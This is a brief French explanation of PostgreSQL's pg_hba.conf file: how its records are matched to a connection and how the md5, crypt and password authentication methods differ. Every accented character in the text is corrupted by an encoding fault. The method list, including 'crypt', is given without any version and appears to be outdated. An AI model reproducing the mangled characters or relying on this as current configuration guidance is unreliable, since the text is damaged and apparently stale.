L'authentification client dans PostgreSQL est g√©r√©e via un fichier de configuration appel√© **pg_hba.conf**. Ce fichier contient une s√©rie d'enregistrements, sp√©cifiant chacun un type de connexion, une plage d'adresses IP client (si applicable), le nom de la base de donn√©es, le nom d'utilisateur, et la m√©thode d'authentification √† utiliser pour les connexions correspondantes. Le premier enregistrement qui correspond au type de connexion, √† l'adresse du client, √† la base de donn√©es demand√©e, et au nom d'utilisateur est utilis√© pour l'authentification. Il n'y a pas de solution de secours si l'authentification √©choue. Si aucun enregistrement ne correspond, l'acc√®s est refus√©.

Les m√©thodes d'authentification bas√©es sur mot de passe disponibles dans pg_hba.conf sont **md5**, **crypt**, et **password**. Ces m√©thodes diff√®rent dans la mani√®re dont le mot de passe est transmis : en hachage MD5, crypt√© en crypt, ou en texte clair. Il est important de noter que la m√©thode crypt ne peut pas √™tre utilis√©e avec des mots de passe qui ont √©t√© crypt√©s dans pg_authid.
